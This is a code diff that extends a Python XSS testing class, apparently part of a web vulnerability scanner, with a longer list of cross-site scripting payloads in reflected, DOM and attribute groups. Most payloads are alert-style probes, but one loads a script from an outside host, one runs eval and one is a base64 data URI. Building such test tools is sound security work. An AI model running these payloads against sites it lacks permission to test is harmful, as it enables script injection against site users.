@@ -8,32 +8,61 @@ import re
 
 class XSSTester:
     def __init__(self):
+        # AGGRESSIVE XSS PAYLOADS - More comprehensive testing
         self.payloads = {
             'reflected': [
                 '<script>alert(1)</script>',
+                '<script>alert(String.fromCharCode(88,83,83))</script>',
                 '<img src=x onerror=alert(1)>',
+                '<img src=x onerror=alert(document.domain)>',
+                '<img src=x onerror=confirm(1)>',
                 '<svg onload=alert(1)>',
+                '<svg/onload=alert(1)>',
+                '<svg><script>alert(1)</script></svg>',
                 'javascript:alert(1)',
                 '<iframe src="javascript:alert(1)">',
+                '<iframe src=javascript:alert(1)>',
                 '"><script>alert(1)</script>',
                 "'><script>alert(1)</script>",
                 '<body onload=alert(1)>',
+                '<body/onload=alert(1)>',
                 '<input autofocus onfocus=alert(1)>',
                 '<select autofocus onfocus=alert(1)>',
                 '<textarea autofocus onfocus=alert(1)>',
                 '<keygen autofocus onfocus=alert(1)>',
                 '<video src=x onerror=alert(1)>',
                 '<audio src=x onerror=alert(1)>',
+                '<details open ontoggle=alert(1)>',
+                '<marquee onstart=alert(1)>',
+                '<object data="javascript:alert(1)">',
+                '<embed src="javascript:alert(1)">',
+                '<<SCRIPT>alert(1);//<</SCRIPT>',
+                '<img src="x" onerror="alert(1)"/>',
+                '<IMG SRC=x OnErRoR=alert(1)>',
+                '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
+                '<script>alert`1`</script>',
+                '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
+                '"><img src=x onerror=prompt(1)>',
+                '"><svg onload=confirm(1)>',
             ],
             'dom': [
                 '#<script>alert(1)</script>',
                 'javascript:alert(1)',
+                'javascript:alert(document.domain)',
                 'data:text/html,<script>alert(1)</script>',
+                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+                '#"><script>alert(1)</script>',
             ],
             'attribute': [
                 '" onload="alert(1)',
                 "' onload='alert(1)",
                 '"><img src=x onerror=alert(1)>',
+                '" autofocus onfocus="alert(1)',
+                "' autofocus onfocus='alert(1)",
+                '"/><script>alert(1)</script>',
+                '`><script>alert(1)</script>',
+                '" onclick="alert(1)',
+                '" onmouseover="alert(1)',
             ]
         }
         
